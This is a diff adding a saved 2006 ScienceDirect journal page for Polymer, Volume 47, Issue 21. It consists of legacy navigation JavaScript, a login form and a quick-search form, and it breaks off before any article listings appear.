@@ -1,0 +1,1329 @@
+
+
+
+<html>
+<head>
+
+  
+    <SCRIPT LANGUAGE="JavaScript">
+
+<!-- Hide Script from non-JavaScript Browsers
+
+var pathToImage = "";
+var oldImage = "";
+var newImage = "";
+var imageSwapped = "";
+var oldState = new Array ();
+var newState = new Array ();
+var pageLoaded = false;
+
+function changeImages (imagePath, imageId)
+{
+  document.done.src = imagePath + "/" + imageId;
+}
+
+function isChangedState ()
+{
+  var length = oldState.length;
+  var ret = false;
+  
+  for (var i = 0; i < length && ret == false; i++)
+  {
+    if (oldState[i] != newState [i])
+    {
+      ret = true;
+    }
+  }
+  
+  return ret;
+}
+
+function setCheckedBoxes (imagePath, imageId1, imageId2)
+{
+  // hack because netscape onLoad does not know about the form name
+  form = document.forms.greenBox;
+  pathToImage = imagePath;
+  oldImage = imageId1;
+  newImage = imageId2;
+  var j = 0;
+  for (var i = 0; i < form.elements.length; i++)
+  {
+    if (form.elements[i].type == "checkbox")
+    {
+      if (form.elements[i].checked)
+      {
+        oldState[j] = newState[j] = true;
+      }
+      else
+      {
+        oldState[j] = newState[j] = false;
+      }
+      
+      j++;
+    }
+  }
+  pageLoaded = true;
+}
+
+function isSameCheckedBox (box1, box2)
+{
+  return (box1.name == box2.name);
+}
+
+function swapImages (hasChanged)
+{
+  if (hasChanged)
+  {
+    if (newImage != imageSwapped)
+    {
+      changeImages (pathToImage, newImage);
+      imageSwapped = newImage;
+    }
+  }
+  else
+  {
+    if (imageSwapped != oldImage)
+    {
+      changeImages (pathToImage, oldImage);
+      imageSwapped = oldImage;
+    }
+  }
+
+  return true;
+}
+
+function updateCheckedBoxes (form, box)
+{
+  var j = 0;
+  var found = false;
+  for (var i = 0; i < form.elements.length && found == false; i++)
+  {
+    if (form.elements[i].type == "checkbox")
+    {
+      if (isSameCheckedBox (form.elements[i], box))
+      {
+        if (box.checked)
+        {
+          newState[j] = true;
+        }
+        else
+        {
+          newState [j] = false;
+        }
+      
+      found = true;
+      }
+      j++;
+    }
+  }
+  
+  return swapImages (isChangedState ());
+}
+
+function checkSubmit ()
+{
+
+  if (pageLoaded == true) 
+  {
+    var ret = isChangedState ();
+    if (ret != false)
+    {
+      var form = document.forms.greenBox;
+
+      form.submit ();
+    }
+  }
+}
+
+//-->
+
+</SCRIPT>
+
+
+  
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+<meta name="description"  content="ScienceDirect - the world's leading platform offers over 2,000 high quality peer-reviewed full-text journals and books on science, technology and medicine."/>
+<!-- static const char journaltmpl_sccsId[] = "@(#)journal.tmpl	3.1.2.1  11/18/99 17:52:55 --- Retrieved: 12/15/99 12:27:24"; -->
+<!-- TRANSKEY: 09/22/2006 07:23:15 EDT#1841_001#8304#162.105.27.41 -->
+<title>ScienceDirect - Polymer, Volume 47, Issue 21, Pages 7329-7610 (4 October 2006)</title>
+</head>
+
+<body  >
+
+
+<link rel="stylesheet" Title="Default Styles" href="http://www.sciencedirect.com/science/page/static/stylesheets/css_table_v01.css" type="text/css">
+<link rel="stylesheet" Title="Default Styles" href="http://www.sciencedirect.com/science/page/static/stylesheets/css_pub_v01.css" type="text/css">
+
+<script language="javascript">
+<!--
+function submitTocList(prevNext){
+  document.Tag.go.value= prevNext;
+  document.Tag.submit();
+}
+//-->
+</script>
+
+
+<SCRIPT LANGUAGE="Javascript"><!--
+
+    function openWindow(url, width, height) {
+        if ((navigator.appName == "Microsoft Internet Explorer") &&
+            (parseFloat(navigator.appVersion) < 4 )) { return false; }
+        var xOffset=10, yOffset=10;
+        var parms = 'width=' + width +
+                    ',height=' + height + 
+                    ',screenX='+ xOffset +
+                    ',screenY=' + yOffset +
+                    ',status=no,toolbar=no,menubar=no' +
+                    ',scrollbars=yes,resizable=yes';
+        nsWin = window.open(url,'subscriptionSummary',parms);
+        nsWin.focus();
+        return false;
+    }
+//--></SCRIPT>
+
+<script language="javascript">
+<!--
+
+   function roll(imgName,imgSrc) {
+       document.images[imgName].src = imgSrc;
+   }
+//-->
+</script>
+
+
+
+
+
+<SCRIPT LANGUAGE="Javascript"><!--
+        function openNS(url) {
+                if ((navigator.appName == "Microsoft Internet Explorer") &&
+                        (parseFloat(navigator.appVersion) < 4 ))
+                {
+                        return false;
+                }
+               
+                var newX=600,newY=400,xOffset=10,yOffset=10;
+                var parms = 'width=' + newX +
+                                ',height=' + newY +
+                                ',screenX='+ xOffset +
+                                ',screenY=' + yOffset +
+                                ',status=yes,toolbar=yes,menubar=yes' +
+                                ',scrollbars=yes,resizable=yes,location=yes';
+                nsWin = window.open(url,'displayWindow',parms);
+                if(navigator.appName != "Microsoft Internet Explorer") {
+                    nsWin.focus();
+                } 
+                return false;
+        }
+
+        function openStrippedNS(url) {
+                if ((navigator.appName == "Microsoft Internet Explorer") &&
+                        (parseFloat(navigator.appVersion) < 4 ))
+                {
+                        return false;
+                }
+
+                var xOffset=10,yOffset=10;
+                var parms = 'screenX='+ xOffset +
+                                ',screenY=' + yOffset +
+                                ',status=yes,toolbar=no,menubar=no' +
+                                ',scrollbars=yes,resizable=yes,location=no';
+                nsWin = window.open(url,'displayWindow',parms);
+                if(navigator.appName != "Microsoft Internet Explorer") {
+                    nsWin.focus();
+                }
+                return false;
+        }
+
+        function openPopup(url, windowName, width, height) {
+            if ((navigator.appName == "Microsoft Internet Explorer") &&
+                (parseFloat(navigator.appVersion) < 4 )) { return false; }
+               
+            var xOffset=10,yOffset=10;
+            var parms = 'width=' + width +
+                        ',height=' + height +
+                        ',screenX=' + xOffset +
+                        ',screenY=' + yOffset +
+                        ',status=no,toolbar=no,menubar=no' +
+                        ',scrollbars=yes,resizable=yes';
+            var displayName = windowName;
+
+            nsWin = window.open(url, displayName, parms);
+            nsWin.focus();
+            return false;
+        }
+//--></SCRIPT>
+
+<SCRIPT LANGUAGE="Javascript"><!--
+function flip(e){
+        var menustyle = eval(getStyleObj(e))
+                if (menustyle.display=="none"){
+                        menustyle.display=''
+                }
+                else{
+                        menustyle.display="none"
+                }
+}
+function getStyleObj(elem,parent) {
+      if (document.layers) {
+            if (parent) {
+                  return "document."+parent+".document."+elem;
+            } else {
+                  return "document."+elem + ".style";
+            }
+      } else if (document.all) {
+            return "document.all."+elem + ".style";
+      } else if (document.getElementById) {
+            return "document.getElementById('"+elem+"').style";
+      }
+}
+//--></SCRIPT>
+
+<link rel="stylesheet" Title="Default Styles" href="/science/page/static/stylesheets/css_gen_v01.css" type="text/css">
+<table border="0" cellspacing="0" cellpadding="0" width="100%">
+  <tr>
+    <td nowrap width="30%" colspan=3 style="padding-left: 0.2em;">
+      <a href="/science?_ob=HomePageURL&_method=userHomePage&_lg=Y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=741e33f8f3de66c15baaa60322f7cbeb" border="0" target="_top"><img src="/science/page/static/science/logo.gif" title="Go to ScienceDirect&reg; Home" alt="Go to ScienceDirect&reg; Home" border="0"></a>
+      <a href="http://www.sciencedirect.com/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd#Skip Buttons" target="_top"><img src="/scidirimg/clear.gif" width="10" height="1" border="0" alt="Skip Main Navigation Links"></a>
+    </td>
+    <td nowrap align="center" valign="middle" bgcolor="#ffffff">
+    
+        
+            
+        
+    
+    </td>
+    <td align="right" width="37%" nowrap style="padding-right: 0.2em;">
+    <span style="font-size: 75%; font-family: arial,verdana,helvetica,sans-serif">
+
+      
+        <meta http-equiv="Set-Cookie" content="BROWSER_SUPPORTS_COOKIES=1; path=/">
+<SCRIPT language="Javascript">
+<!---------------
+document.write("<div style=\"padding:0.4em\">");
+document.write("<div id=\"sdLoginBoxFold\" >");
+document.write("<a href=\"javascript:flip('sdLoginBox'); javascript:flip('sdLoginBoxFold');\" title=\"Open the Login Box\">Login: &nbsp;<img src=\"/scidirimg/sign_plus.gif \" width=\"9\" height=\"9\" alt=\"+\" border=\"0\" title=\"Open the Login Box\"/></a><br>");
+
+document.write("<a href=\"https://www.sciencedirect.com/science?_ob=RegistrationURL&_method=display&_type=ip&_returnURL=http%3A%2F%2Fwww.sciencedirect.com%2Fscience%3F_ob%3DPublicationURL%26_cdi%3D5601%26_pubType%3DJ%26_auth%3Dy%26_acct%3DC000053662%26_version%3D1%26_urlVersion%3D0%26_userid%3D1553416%26md5%3D60b14ba14f8b3ec1a83635636a1c30fd&_acct=C000053662&_version=1&_userid=1553416&md5=867686e8a557dcfa018b11e9d4ff6960\" target=\"_top\" title=\"Click here to learn about registering with ScienceDirect\">Register</a>");
+
+document.write("</div>");
+document.write("</div>");
+document.write("<div id=\"sdLoginBox\"");
+document.write("style=\"background-image: url(/scidirimg/login_background.gif); background-repeat: repeat-x; height:70px;padding:0.2em;");
+document.write("display:none;\">");
+
+	document.write("<form name=\"sdLogin\" method=\"POST\" action=\"https://www.sciencedirect.com/science/login\">");
+	document.write("<input type=\"hidden\" name=\"login\" value=\"login\">");
+	document.write("<table width=\"100%\" cellspacing=\"0\" cellpadding=\"0\">");
+	document.write("<tr valign=\"top\">");
+	document.write("<td align=\"left\" nowrap>");
+
+ 
+document.write("</td>");
+ 
+
+document.write("<tr><td nowrap>&nbsp;<a href=\"/science?_ob=FederationURL&_method=display&_type=f&_acct=C000053662&_version=1&_userid=1553416&md5=6bad3a9fb0474be64c0f23c5645c94dd\"title=\"Athens/Institution Login\">Athens/Institution Login</a>&nbsp;</font></td>");
+
+
+
+ 
+ document.write("<td align=\"right\">");
+
+ document.write("<a href=\"https://www.sciencedirect.com/science?_ob=RegistrationURL&_method=display&_type=ip&_returnURL=http%3A%2F%2Fwww.sciencedirect.com%2Fscience%3F_ob%3DPublicationURL%26_cdi%3D5601%26_pubType%3DJ%26_auth%3Dy%26_acct%3DC000053662%26_version%3D1%26_urlVersion%3D0%26_userid%3D1553416%26md5%3D60b14ba14f8b3ec1a83635636a1c30fd&_acct=C000053662&_version=1&_userid=1553416&md5=867686e8a557dcfa018b11e9d4ff6960\" title=\"Click here to learn about registering with ScienceDirect\">Not Registered?&nbsp;</a>");
+
+
+document.write("<a href=\"javascript:flip('sdLoginBox');javascript:flip('sdLoginBoxFold');\" title=\"Close the Login Box\">");
+document.write("<img src=\"/scidirimg/sign_minus.gif\" width=\"9\" height=\"9\" alt=\"-\" border=\"0\" title=\"Close the Login Box\"/>");
+document.write("</a>");
+
+
+document.write("</td>");
+document.write("</tr>");
+document.write("</table>");
+document.write("<table width=\"100%\" cellspacing=\"0\" cellpadding=\"0\">");
+document.write("<tr align=\"right\">");
+document.write("<td align=\"left\">User&nbsp;Name:</td>");
+document.write("<td align=\"left\">");
+document.write("<input type=\"text\" name=\"userid\" class=\"xpstyle\" size=\"11\" title=\"Please enter your user name here\" />");
+document.write("</td>");
+document.write("<td align=\"right\">Password: </td>");
+document.write("<td align=\"left\">");
+document.write("<input type=\"password\" name=\"password\" class=\"xpstyle\" size=\"11\" maxlength=\"20\" title=\"Please enter your password here\" />");
+document.write("</td>");
+document.write("<input type=\"hidden\" name=\"_ob\" value=\"MiamiLogonURL\">");
+document.write("<input type=\"hidden\" name=\"targetURL\" value=\"http://www.sciencedirect.com/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd\" >")
+document.write("<input type=\"hidden\" name=\"returnURL\" value=\"http://www.sciencedirect.com/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd\">");
+document.write("<td align=\"left\"><input class=\"image\" type=\"image\" onmouseover=\"this.src='/scidirimg/sci_dir/arrow_small_b.gif'\" onmouseout=\"this.src='/scidirimg/sci_dir/arrow_small_a.gif'\" name=\"arrow\" src=\"/scidirimg/sci_dir/arrow_small_a.gif\" title=\"Login\" value=\"Submit\" /></a>");
+document.write("		</td>");
+document.write("</tr>");
+document.write("<tr valign=\"baseline\">");
+document.write("<td align=\"left\" colspan=\"3\">");
+
+document.write("<input type=\"checkbox\" name=\"rememberid\" id=\"rememberMe\" value=\"Y\" class=\"checkbox\" title=\"Checking this option will log you in automatically next time you visit ScienceDirect\"/>");
+document.write("<label for=\"rememberMe\"><span title=\"Checking this option will log you in automatically next time you visit ScienceDirect\">Remember&nbsp;me&nbsp;on&nbsp;this&nbsp;computer</span></label>");
+
+document.write("</td>");
+document.write("<td align=\"left\" colspan=\"2\">");
+document.write("<a href=\"/science?_ob=ReminderURL&_method=display&_acct=C000053662&_version=1&_userid=1553416&md5=cc3a0d811ac55e81e6a50d2d4fd9e12b\" target=\"passwd\" onClick=\"var remindWin;remindWin=window.open('','passwd','scrollbars=yes,resizable=yes,directories=no,toolbar=n,menubar=no,status=no,width=650,height=300');\" title=\"Click here for help in recovering your ScienceDirect access\">Forgotten&nbsp;password?</a>");
+document.write("</td>");
+document.write("</tr>");
+document.write("</table></form></div>");
+//---------->
+</SCRIPT>
+<NOSCRIPT>
+<div id="sdLoginBox" 
+style="background-image: url(/scidirimg/login_background.gif); background-repeat: repeat-x; height:70px;padding:.02em;">
+	<form name="sdLogin" method="POST" action="https://www.sciencedirect.com/science/login">
+		<input type="hidden" name="login" value="login">
+		<table width="100%" cellspacing="0" cellpadding="0">
+			<tr valign="top">
+
+
+ 
+  <tr>
+  <td nowrap align="left">
+  &nbsp;<a href="/science?_ob=FederationURL&_method=display&_type=f&_acct=C000053662&_version=1&_userid=1553416&md5=6bad3a9fb0474be64c0f23c5645c94dd"title="Athens/ Institution Login">Athens/Institution Login</a>&nbsp;</font></td>
+
+
+
+  <td align="right">
+
+<a href="https://www.sciencedirect.com/science?_ob=RegistrationURL&_method=display&_type=ip&_returnURL=http%3A%2F%2Fwww.sciencedirect.com%2Fscience%3F_ob%3DPublicationURL%26_cdi%3D5601%26_pubType%3DJ%26_auth%3Dy%26_acct%3DC000053662%26_version%3D1%26_urlVersion%3D0%26_userid%3D1553416%26md5%3D60b14ba14f8b3ec1a83635636a1c30fd&_acct=C000053662&_version=1&_userid=1553416&md5=867686e8a557dcfa018b11e9d4ff6960" title="Click here to learn about registering with ScienceDirect" target="_top">Not Registered? </a>
+
+</td>
+
+
+</tr>
+</table>
+
+		<table width="100%" cellspacing="0" cellpadding="0">
+			<tr align="right">
+				<td align="left">User&nbsp;Name: </td>
+				<td align="left">
+					<input type="text" name="userid" class="xpstyle" size="11" title="Please enter your user name here" />
+				</td>
+				<td align="right">Password: </td>
+				<td align="left">
+					<input type="password" name="password" class="xpstyle" size="11" maxlength="20" title="Please enter your password here" />
+				</td>
+<input type="hidden" name="_ob" value="MiamiLogonURL">
+<input type="hidden" name="targetURL" value="http://www.sciencedirect.com/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd" >
+<input type="hidden" name="returnURL" value="http://www.sciencedirect.com/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd" >
+				<td align="left"><input class="image" type="image" src="/scidirimg/sci_dir/arrow_small_a.gif" title="Login" alt="Go" value="Submit" /></a>
+				</td>
+			</tr>
+			<tr valign="baseline">
+				<td align="left" colspan="3">
+                                
+					<input type="checkbox" name="rememberid"id="rememberMe" value="Y" class="checkbox" title="Checking this option will log you in automatically next time you visit ScienceDirect"/>
+					<label for="rememberMe"><span title="Checking this option will log you in automatically next time you visit ScienceDirect">Remember&nbsp;me&nbsp;on&nbsp;this&nbsp;computer</span></label>
+                                
+				</td>
+				<td align="left" colspan="2">
+					<a href="/science?_ob=ReminderURL&_method=display&_acct=C000053662&_version=1&_userid=1553416&md5=cc3a0d811ac55e81e6a50d2d4fd9e12b" target="passwd" onClick="var remindWin;remindWin=window.open('','passwd','scrollbars=yes,resizable=yes,directories=no,toolbar=n,menubar=no,status=no,width=650,height=300');" title="Click here for help in recovering your ScienceDirect access">Forgotten&nbsp;password?</a>
+				</td>
+			</tr>
+		</table></form></div>
+</NOSCRIPT>
+		</td>
+	</tr>
+
+    </td>
+  </tr>
+ </span>
+
+</td></tr></table>
+
+
+<span style="font-size: 75%; font-family: arial,verdana,helvetica,sans-serif">
+<table class="sdMainNav sci_dirNav" style="font-size: 1em;background-image: url(/scidirimg/sci_dir/navbar_back.gif);" border="0" cellpadding="0" cellspacing="0">
+    <tr>
+      <td  align="right" width="1%">&nbsp;</td>
+      <td align="left"><img src="/scidirimg/space.gif" height="1" width="1"><table class="sdMainNavCenter" style="font-size:1em" cellpadding="0" cellspacing="0">
+        <tr valign="center">
+
+      <td valign="center" align="left" nowrap class="sdMainNav" onmouseover="this.style.backgroundImage='url(/scidirimg/sci_dir/navbar_select.gif)';this.style.backgroundColor='#005d2a'" onmouseout="this.style.backgroundImage='';this.style.backgroundColor=''"><a href="/science?_ob=HomePageURL&_method=userHomePage&_btn=Y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=741e33f8f3de66c15baaa60322f7cbeb" target="_top" name="Home" alt="Home" title="Home"><div class="sdMainNavPadding">Home</div></a></td>
+
+<td valign="center" align="left" nowrap class="sdMainNav sci_dirNavActive" style="background-image: url(/scidirimg/sci_dir/navbar_select.gif)"><a href="/science?_ob=BrowseListURL&_type=all&_auth=y&_btn=Y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=e5e46aece04c05c403e077e32f859b6d" target="_top" name="Browse" alt="Browse" title="Browse"><div class="sdMainNavPadding">Browse</div></a></td>
+
+<td valign="center" align="left" nowrap class="sdMainNav" onmouseover="this.style.backgroundImage='url(/scidirimg/sci_dir/navbar_select.gif)';this.style.backgroundColor='#005d2a'" onmouseout="this.style.backgroundImage='';this.style.backgroundColor=''"><a href="/science?_ob=MiamiSearchURL&_method=requestForm&_btn=Y&_acct=C000053662&_version=1&_urlVersion=1&_userid=1553416&md5=2a084b2335303a8eeaefb6d3262b1494" target="_top" name="Search" alt="Search" title="Search"><div class="sdMainNavPadding">Search</div></a></td>
+
+<td valign="center" align="left" nowrap class="sdMainNav" onmouseover="this.style.backgroundImage='url(/scidirimg/sci_dir/navbar_select.gif)';this.style.backgroundColor='#005d2a'" onmouseout="this.style.backgroundImage='';this.style.backgroundColor=''"><a href="/science?_ob=AbstractDBListURL&_btn=Y&_acct=C000053662&_version=1&_userid=1553416&md5=2dc8da25d90c25b2229fdf86b5dad58e" target="_top" name="database" alt="Abstract Databases" title="Abstract Databases"><div class="sdMainNavPadding">Abstract Databases</div></a></td>
+
+      <td valign="center" align="left" nowrap class="sdMainNav" onmouseover="this.style.backgroundImage='url(/scidirimg/sci_dir/navbar_select.gif)';this.style.backgroundColor='#005d2a'" onmouseout="this.style.backgroundImage='';this.style.backgroundColor=''"><a href="/science?_ob=UserSubscriptionURL&_method=begin&_btn=Y&_acct=C000053662&_version=1&_urlVersion=1&_userid=1553416&md5=d1bed7f038a272f4dd621df688e7c6f1" target="_top" name="account" alt="My Settings" title="My Settings"><div class="sdMainNavPadding">My Settings</div></a></td>
+
+      <td valign="center" align="left" nowrap class="sdMainNav" onmouseover="this.style.backgroundImage='url(/scidirimg/sci_dir/navbar_select.gif)';this.style.backgroundColor='#005d2a'" onmouseout="this.style.backgroundImage='';this.style.backgroundColor=''"><a href="/science?_ob=MiamiSDIURL&_method=listAlerts&_btn=Y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=bbc1d226e4a562cdb2ba9cdaf5ffc71f" target="_top" name="alert" alt="Alerts" title="Alerts"><div class="sdMainNavPadding">Alerts</div></a></td>
+
+      
+
+      <td valign="center" align="left" nowrap class="sdMainNav" onmouseover="this.style.backgroundImage='url(/scidirimg/sci_dir/navbar_select.gif)';this.style.backgroundColor='#005d2a'" onmouseout="this.style.backgroundImage='';this.style.backgroundColor=''"><a href="/science?_ob=HelpURL&_file=jnl_bk_homepage.htm&_btn=Y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=dd2d6c1f039bd3d34fcc10fdec285a3c" target="sdhelp" alt="Help (Opens new window)" title="Help (Opens new window)" onClick="var helpWin; helpWin=window.open('/science?_ob=HelpURL&_file=jnl_bk_homepage.htm&_btn=Y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=dd2d6c1f039bd3d34fcc10fdec285a3c','sdhelp','scrollbars=yes,resizable=yes,directories=no,toolbar=no,menubar=no,status=no,width=760,height=570'); helpWin.focus(); return false"><div class="sdMainNavPadding">Help</div></a></td>
+</tr></table>
+</td></tr></table>
+</span>
+<table border=0 cellpadding=0 cellspacing=0 width=100%>
+<tr><td><a name="Skip Buttons"></a><script language="javascript">
+<!--
+function clearQSForm() {
+    document.qkSrch.qs_tak.value="";
+    document.qkSrch.qs_author.value="";
+    document.qkSrch.qs_title.value="";
+    document.qkSrch.qs_vol.value="";
+    document.qkSrch.qs_issue.value="";
+    document.qkSrch.qs_pages.value="";
+}
+//-->
+</script>
+
+<div id="sdQuickSearch" style="font-size: 75%">
+<div style="background-image: url(/scidirimg/sci_dir/qs_background.gif); background-repeat: repeat-x; background-position: bottom left; background-color:#dadada">
+<table border="0" width="100%">
+<form name="qkSrch" method="get" target="_top" action="/science">
+<input type="hidden" name="_ob" value="QuickSearchURL">
+<input type="hidden" name="_method" value="submitForm">
+<input type="hidden" name="_acct" value="C000053662">
+<input type="hidden" name="md5" value="1983845e91625a00d9c9970dd91b4351">
+<input type="hidden" name="qs_smi" value="5601">
+<tr valign=center><td align=left nowrap>&nbsp;<b>Quick Search</b></td>
+   <td align="right">&nbsp;&nbsp;Title,&nbsp;abstract,&nbsp;keywords</td>
+   <td align=left><input type="text" name="qs_tak" value="" size=28 maxlength=450 title="For example: heart attack AND behavio*" class="qsinput xpstyle" tabindex=1></td>
+   <td align=right>&nbsp;&nbsp;Author</td>
+   <td align-left colspan=5><input type="text" name="qs_author" value="" size=30 maxlength=450 title="For example: j s smith" class="qsinput xpstyle" tabindex=2></td>
+   <td colspan=2 nowrap><span style="font-size:0.9em">e.g.&nbsp;&nbsp;j s smith</span>
+
+   </td>
+   <td align=right valign=top width=90%></td>
+</tr>
+<tr valign=center><td align=left nowrap>&nbsp;<a href="/science?_ob=HelpURL&_file=qs_main.htm&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=85824f5572c2a1a6a4f1c8a861d25161" target="sdhelp" onMouseOver="window.status='Help is Available';return true" onClick="var helpWin; helpWin=window.open('qs_main.htm','sdhelp','scrollbars=yes,resizable=yes,directories=no,toolbar=no,menubar=no,status=no,width=760,height=570'); helpWin.focus()"><img src="/scidirimg/qs_tips.gif" border=0 align=absmiddle tabindex=9 alt="Search tips (Opens new window)" title="Search tips (Opens new window)"></a></td>
+   <td align="right">&nbsp;&nbsp;Journal/book&nbsp;title</td>
+   <td align="left"><input type="text" name="qs_title" value="--This Journal/Book--" size=28 maxlength=450 title="For example: journal of molecular biology" tabindex=3 class="qsinput xpstyle"></td>
+   <td align="right">&nbsp;&nbsp;Volume</td>
+   <td align="left"><input type="text" name="qs_vol" value="" size=3 maxlength=10 class="qsinput xpstyle" style="width:30px" tabindex=4></td>
+   <td align="right">&nbsp;&nbsp;Issue</td>
+   <td align="left"><input type="text" name="qs_issue" value="" size=3 maxlength=10 class="qsinput xpstyle" style="width:30px" tabindex=5></td>
+   <td align="right">&nbsp;&nbsp;Page</td>
+   <td align="right"><input type="text" name="qs_pages" value="" size=3 maxlength=10 title="For example: 14-27" class="qsinput xpstyle" style="width:30px" tabindex=6></td>
+   <td align="left" colspan=2 nowrap>&nbsp;&nbsp;&nbsp;&nbsp;<a href="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&clearQS=y" onclick="clearQSForm(); return false;" onmouseover="document.images['clearQS'].src='/scidirimg/sci_dir/btn_clear2.gif'" onmouseout="document.images['clearQS'].src='/scidirimg/sci_dir/btn_clear1.gif'" ><img src="/scidirimg/sci_dir/btn_clear1.gif" alt="Clear all fields" title="Clear all fields" name="clearQS" border=0 tabindex=7></a>&nbsp;&nbsp;&nbsp;&nbsp;<input type="image" src="/scidirimg/sci_dir/btn_go1.gif" onmouseover="this.src='/scidirimg/sci_dir/btn_go2.gif'" onmouseout="this.src='/scidirimg/sci_dir/btn_go1.gif'" alt="Submit Quick Search" title="Submit Quick Search" value="Submit" tabindex=8></td></tr>
+
+</form>
+</table>
+</div>
+</div>
+</td></tr>
+</table>
+<div style="margin-left:8px; margin-right: 5px;">
+<div style="width:100%">
+
+
+
+
+
+
+<!-- journal title and related information, and data list -->
+<table class=pubBody width="100%" border=0>
+  <tr>
+
+    
+    
+      <td width="7%" valign="top" rowspan="2">
+        
+          <a href="http://www.elsevier.com/locate/issn/00323861" onClick="openNS('http://www.elsevier.com/locate/issn/00323861'); return false;">
+            <img src="/science/page/jcover/00323861_00470021_cov150h.gif" alt="About this Journal" title="About this Journal" border="1" style="border-style: solid; border-color: #000000">
+          </a>
+        
+      </td>
+    
+
+    
+    <td width="55%" class="txt" valign="top" align="left">
+      <span class="journalHead">
+        
+          <b>Polymer</b>
+        
+      </span>
+      <br>
+      <span class="txtSmall">Copyright &copy; 2006 Elsevier Ltd.  All rights reserved</span>
+      
+        <br>
+        <span class="txtSmall">Shortcut URL to this page:&nbsp;<a href="http://www.sciencedirect.com/science/journal/00323861" title="Right-Click to add ''Polymer'' to your browser's Favorites/Bookmarks."><b>http://www.sciencedirect.com/science/journal/00323861</b></a>
+        </span>
+      
+      
+        <br><br><span class="txt">Incorporating  <b><A HREF="/science?_ob=PublicationURL&_cdi=6089&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=493b70fedfd6cb46470879ff8728d2e1">Computational and Theoretical Polymer Science</A></b><BR></span>
+      
+      <br>
+    </td>
+
+    
+    <td width="1%" class="txt" align="right" valign="top">
+      
+  <table class="txt" border="0" align="right" valign="top" width="100%" cellpadding="0" cellspacing="0">
+    <form name = "greenBox" method = "post" action = "/science?_ob=PublicationURL&_fromGreenBox=1&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=c0389eaf112cf54e20bacf2be97ce441">
+      
+        <tr valign="top">
+          <td nowrap align="right">
+            <label for="alert">
+              Alert me about new Journal Issues
+              <input type="checkbox" id="alert" name="newIssueAlert" value="1"  onClick="updateCheckedBoxes (greenBox, greenBox.newIssueAlert)"></input>
+            </label>
+          </td>
+        </tr>
+      
+
+      
+        <tr valign="top">
+          <td nowrap align="right">
+            <label for="favorite">
+              Add to Favorites
+              <input type="checkbox" id="favorite" name="addFavorite" value="1"  onClick="updateCheckedBoxes (greenBox, greenBox.addFavorite)"></input>
+            </label>
+          </td>
+        </tr>
+      
+      <tr>
+        <td align="right">
+          <a href="javascript:checkSubmit();" onmouseover="roll('done','/scidirimg/sci_dir/btn_apply2.gif')" onmouseout="roll('done','/scidirimg/sci_dir/btn_apply1.gif')">
+            <img name="done" src="/scidirimg/sci_dir/btn_apply1.gif" alt="Apply alert and favorite settings" title="Apply alert and favorite settings" style="border:0px;vertical-align:middle;"></a>
+        </td>
+      </tr>
+      
+    </form>
+  </table>
+
+
+          <script>setCheckedBoxes ('/scidirimg/sci_dir', 'btn_apply1.gif', 'btn_apply1.gif');</script>
+          
+      
+      
+        <br><!--default for JRLZ1-->
+      
+    </td>
+  </tr>
+
+  
+  
+  <tr>
+    <td colspan="2" valign="bottom">
+      <table bgcolor="#dddddd" width="100%" border=0 class="txt">
+        <tr>
+          <td colspan="2" valign="middle" class="txt" height=16px> 
+            
+              &nbsp;<a href="/science?_ob=PublicationURL&_tockey=%23TOC%235601%232006%23999529998%23613998%23FLA%23&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=3016b308d4443178b37951067f837028" title="Sample Issue Online">Sample Issue Online</a>
+            
+            
+              &nbsp;|
+              &nbsp;<a href="http://www.elsevier.com/locate/issn/00323861" target="pubWindow" onClick="var aWin; aWin=window.open('http://www.elsevier.com/locate/issn/00323861','pubWindow','scrollbars=yes,resizable=yes,directories=no,toolbar=yes,menubar=yes,status=yes,width=780,height=500'); aWin.focus(); return false;" title="About this Journal, e.g. Description; Editorial Board; Ordering Information; Dispatch Dates -where applicable- (Opens new window)">About this Journal</a>
+            
+            
+              &nbsp;|
+              &nbsp;<a href = "/science?_ob=RedirectURL&_method=authServLink&_cdi=5601&_targetURL=http%3A%2F%2Fauthors.elsevier.com%2Fissn%2F00323861&_acct=C000053662&_version=1&_userid=1553416&md5=0c0a1d2389c7d54329d1791bd0698b97" onClick = "openNS ('/science?_ob=RedirectURL&_method=authServLink&_cdi=5601&_targetURL=http%3A%2F%2Fauthors.elsevier.com%2Fissn%2F00323861&_acct=C000053662&_version=1&_userid=1553416&md5=0c0a1d2389c7d54329d1791bd0698b97'); return false;" title="Submit your Article (Opens new window)" alt="Submit your Article (Opens new window)">Submit your Article</a>
+            
+            
+          </td>
+        </tr>
+      </table>
+    </td>
+  </tr>
+  
+</table>
+
+
+
+
+
+
+<div valign="top">
+  <div style="float:left;width:210px;">
+    
+    
+      
+        <table class=pubBody cellspacing="0" cellpadding="2" width="100%" style="border: 2px solid #666666;border-bottom: 0px;">
+          <tr>
